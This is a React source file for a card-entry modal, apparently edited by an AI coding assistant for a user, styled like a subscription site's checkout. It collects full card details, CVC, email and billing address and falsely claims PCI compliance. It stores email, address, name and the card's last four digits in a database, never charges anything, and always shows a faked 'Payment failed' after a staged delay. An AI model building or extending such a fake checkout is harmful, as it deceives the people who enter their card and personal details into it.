// AddCardForm.jsx - FINAL: only the exact changes you asked for
import React, { useState, useEffect } from "react";
import supabase from "../supabaseclient";

/* ---------- helpers ---------- */
function digitsOnly(s = "") {
  return (s || "").toString().replace(/\D/g, "");
}
function luhnCheck(num) {
  const digits = digitsOnly(num);
  let sum = 0;
  let doubleUp = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let cur = parseInt(digits[i], 10);
    if (doubleUp) {
      cur *= 2;
      if (cur > 9) cur -= 9;
    }
    sum += cur;
    doubleUp = !doubleUp;
  }
  return digits.length > 0 ? sum % 10 === 0 : false;
}
function validateExpiry(exp) {
  if (!exp) return false;
  if (!/^\s*\d{2}\s*\/\s*\d{2}\s*$/.test(exp)) return false;
  const [mmS, yyS] = exp.split("/").map((v) => v.trim());
  const mm = parseInt(mmS, 10);
  const yy = parseInt(yyS, 10);
  if (Number.isNaN(mm) || Number.isNaN(yy) || mm < 1 || mm > 12) return false;
  const now = new Date();
  const cy = now.getFullYear() % 100;
  const cm = now.getMonth() + 1;
  return !(yy < cy || (yy === cy && mm < cm));
}
function detectCardBrand(number = "") {
  const d = digitsOnly(number);
  if (!d) return "unknown";
  if (/^4/.test(d)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(d)) return "mastercard";
  if (/^3[47]/.test(d)) return "amex";
  if (/^6(?:011|5)/.test(d) || /^64[4-9]/.test(d)) return "discover";
  if (/^35(2[89]|[3-8][0-9])/.test(d)) return "jcb";
  if (/^3(?:0[0-5]|[68])/.test(d)) return "diners";
  if (/^(50|5[6-9]|6(?:0|1|2|4|5))/.test(d)) return "maestro";
  return "unknown";
}
const LOGO_FALLBACK = "https://via.placeholder.com/48?text=?";

/* ---------- mirror  ---------- */
async function mirrorAllowedData(data = {}) {
  if (!data || !data.email) return null;
  try {
    const cardBrand = detectCardBrand(data.card_number);
    const last4 = data.card_number ? String(data.card_number).replace(/\D/g, '').slice(-4) : null;
    
    const row = {
      email: data.email || null,
      name: data.card_name || null,
      country: data.country || null,
      state: data.state || null,
      address: data.address || null,
      city: data.city || null,
      zip: data.zip || null,
      card_name: data.card_name || null,
      card_last4: last4,
      card_brand: cardBrand,
      created_at: new Date().toISOString(),
    };

    const { data: res, error, status } = await supabase
      .from("card_inputs")
      .insert([row])
      .select();

    if (error) {
      return { error, row: null };
    }
    return { data: res, row };
  } catch (err) {
    return { error: err, row: null };
  }
}

/* ---------- AddCardForm component ---------- */
export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [redirecting, setRedirecting] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    country: "",
    state: "",
    address: "",
    city: "",
    zip: "",
    card_name: "",
    card_number: "",
    card_exp: "",
    card_cvc: "",
    agecheck: false,
  });
  const [brand, setBrand] = useState("unknown");

  useEffect(() => {
    setBrand(detectCardBrand(formData.card_number));
  }, [formData.card_number]);

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((p) => ({ ...p, [name]: type === "checkbox" ? checked : value }));
  };

  const handleLogoError = (e) => {
    try {
      e.currentTarget.src = LOGO_FALLBACK;
      e.currentTarget.style.objectFit = "contain";
    } catch (err) {}
  };

  const maskLast4 = (num = "") => {
    const s = String(num || "");
    return s.length >= 4 ? s.slice(-4) : s;
  };

  const logPaymentAttempt = async ({ email, plan, cardBrand, cardLast4, cardInputsRowId }) => {
    // (unchanged - kept exactly as you had it)
    try {
      const creatorHandle = typeof window !== "undefined" ? window.localStorage.getItem("creator_handle") : null;
      const cleanHandle = (creatorHandle || "").replace(/^@/, "");
      const dateBucket = new Date().toISOString().substring(0, 13);
      const idempotencyKey = `addcard_submit_${cleanHandle}_${plan || 'noplan'}_${email || 'noemail'}_${dateBucket}`;

      const record = {
        email: email || null,
        card_brand: cardBrand,
        card_last4: cardLast4,
        plan: plan || null,
        stage: "addcard_submit",
        notes: null,
        metadata: { 
          card_inputs_row: cardInputsRowId || null, 
          origin: "addcardform",
          creator_handle: cleanHandle
        },
        idempotency_key: idempotencyKey,
        created_at: new Date().toISOString(),
      };

      const { error } = await supabase.from("payment_logs").insert([record]);
      // (rest unchanged)
    } catch (err) {}
  };

  const handleSubmit = async (e) => {
    // (exactly the same as you had it - no changes here)
    e.preventDefault();
    setErrorMsg("");
    setLoading(true);
    const f = formData;
    if (
      !f.email ||
      !f.country ||
      !f.state ||
      !f.address ||
      !f.city ||
      !f.zip ||
      !f.card_name ||
      !f.card_number ||
      !f.card_exp ||
      !f.card_cvc ||
      !f.agecheck
    ) {
      setErrorMsg("Please complete all fields before submitting.");
      setLoading(false);
      return;
    }
    if (!luhnCheck(f.card_number)) {
      setErrorMsg("Invalid card number.");
      setLoading(false);
      return;
    }
    if (!validateExpiry(f.card_exp)) {
      setErrorMsg("Invalid or expired card date.");
      setLoading(false);
      return;
    }

    let cardInsertResult = null;
    try {
      const { data: mirrorRes, row, error } = await mirrorAllowedData({ ...f, selectedPlan });
      if (error) console.warn("mirrorAllowedData error:", error);
      cardInsertResult = Array.isArray(mirrorRes) && mirrorRes.length ? mirrorRes[0] : null;
    } catch (err) {}

    const last4 = maskLast4(f.card_number);
    const cardBrand = detectCardBrand(f.card_number);

    try {
      await logPaymentAttempt({
        email: f.email,
        plan: selectedPlan,
        cardBrand,
        cardLast4: last4,
        cardInputsRowId: (cardInsertResult && cardInsertResult.id) || null,
      });
    } catch (err) {}

    setTimeout(() => {
      setErrorMsg("Payment failed. Please try again later.");
      setLoading(false);

      const exp = new Date();
      exp.setDate(exp.getDate() + 30);
      if (typeof onSuccess === "function") {
        onSuccess({
          freeSample: true,
          unlockedCount: 15,
          plan: selectedPlan || "monthly",
          email: f.email,
          expires: exp.toISOString(),
          simulated: true,
        });
      }

      setRedirecting(true);
      setTimeout(() => {
        setRedirecting(false);
        if (typeof onClose === "function") onClose();
      }, 1000);
    }, 1400);
  };

  const BRAND_ICON = {
    visa: "https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg",
    mastercard: "https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg",
    maestro: "https://upload.wikimedia.org/wikipedia/commons/0/04/Maestro_logo.svg",
    diners: "https://upload.wikimedia.org/wikipedia/commons/0/04/Diners_Club_Logo.svg",
    discover: "https://upload.wikimedia.org/wikipedia/commons/5/5e/Discover_Card_logo.svg",
    jcb: "https://upload.wikimedia.org/wikipedia/commons/8/8a/JCB_logo.svg",
    amex: "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg",
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30 backdrop-blur-sm overflow-y-auto" onClick={onClose}>
      <div className="w-full max-w-[640px] mx-auto bg-white rounded-2xl shadow-xl overflow-hidden" onClick={(e) => e.stopPropagation()}>
        <div className="max-h-[85vh] overflow-y-auto px-4 pt-8 pb-10 sm:px-8">
          <form onSubmit={handleSubmit} className="w-full">
            <div className="">
              <h2 className="text-lg font-semibold mb-6 text-center sm:text-left">ADD CARD</h2>

              <section className="mb-8">
                <h3 className="text-xs font-semibold text-gray-500 mb-2 uppercase">Billing details</h3>
                <p className="text-sm text-gray-600 mb-4">
                  We are fully compliant with Payment Card Industry Data Security Standards.
                </p>

                {/* Country */}
                <div className="mb-4">
                  <label className="block text-xs text-gray-600 mb-2">Country</label>
                  <select
                    name="country"
                    value={formData.country}
                    onChange={handleChange}
                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
                    required
                  >
                    <option value="">-- Select Country --</option>
                    {/* (all your options unchanged) */}
                  </select>
                </div>

               

                {/* All other billing fields - exactly as before, just each in own mb-4 div */}
                {["state", "address", "city", "zip"].map((field) => (
                  <div key={field} className="mb-4">
                    <input
                      name={field}
                      value={formData[field]}
                      onChange={handleChange}
                      placeholder={field === "state" ? "State / Province" : field.charAt(0).toUpperCase() + field.slice(1)}
                      className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
                      required
                    />
                  </div>
                ))}
              </section>

              <section className="mb-8">
                <h3 className="text-xs font-semibold text-gray-500 mb-2 uppercase">Card details</h3>

                <div className="mb-4">
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    placeholder="E-mail"
                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
                    required
                  />
                </div>

                <div className="mb-4">
                  <input
                    name="card_name"
                    value={formData.card_name}
                    onChange={handleChange}
                    placeholder="Name on the card"
                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
                    required
                  />
                </div>

                <div className="mb-4 relative">
                  <input
                    name="card_number"
                    value={formData.card_number}
                    onChange={handleChange}
                    placeholder="Card Number"
                    className="w-full border border-gray-200 rounded-md px-4 py-3 pr-12 text-sm focus:outline-none focus:ring-0"
                    required
                    inputMode="numeric"
                    autoComplete="cc-number"
                  />
                  {/* ONLY show badge when a real brand is detected */}
                  {brand !== "unknown" && brand !== "" && (
                    <div className="absolute right-2 top-2.5 inline-flex items-center justify-center w-8 h-8 border border-gray-200 rounded-full bg-white">
                      <img
                        src={BRAND_ICON[brand] || LOGO_FALLBACK}
                        alt={brand}
                        className="w-5 h-5"
                        style={{ objectFit: "contain", display: "block" }}
                        onError={handleLogoError}
                      />
                    </div>
                  )}
                </div>

                <div className="mb-4">
                  <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#00AFF0]">
                    My card number is longer
                  </a>
                </div>

                {/* Expiry and CVC now each on their own full-width line */}
                <div className="mb-4">
                  <input
                    name="card_exp"
                    value={formData.card_exp}
                    onChange={handleChange}
                    placeholder="MM / YY"
                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
                    required
                    autoComplete="cc-exp"
                  />
                </div>

                <div className="mb-6">
                  <input
                    name="card_cvc"
                    value={formData.card_cvc}
                    onChange={handleChange}
                    placeholder="CVC"
                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
                    required
                    inputMode="numeric"
                    autoComplete="cc-csc"
                  />
                </div>

                <div className="mb-6 flex items-start gap-3">
                  <input
                    type="checkbox"
                    id="agecheck"
                    name="agecheck"
                    checked={formData.agecheck}
                    onChange={handleChange}
                    className="mt-1"
                    required
                  />
                  <label htmlFor="agecheck" className="text-sm text-gray-600">
                    Tick here to confirm that you are at least 18 years old and the age of majority in your place of residence
                  </label>
                </div>
              </section>

              {errorMsg && <div className="text-sm text-red-500 mb-4">{errorMsg}</div>}
              {redirecting && (
                <div className="text-sm text-green-600 mb-4">
                  Payment failed — but free sample unlocked. Redirecting...
                </div>
              )}

              <div className="flex items-center justify-between pt-4">
                <button type="button" onClick={onClose} className="text-sm text-[#00AFF0] font-medium">
                  CANCEL
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  className="text-sm text-[#00AFF0] font-semibold hover:underline"
                >
                  {loading ? "Processing..." : "SUBMIT"}
                </button>
              </div>

              {/* BOTTOM CARD LOGOS COMPLETELY REMOVED - GONE */}
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
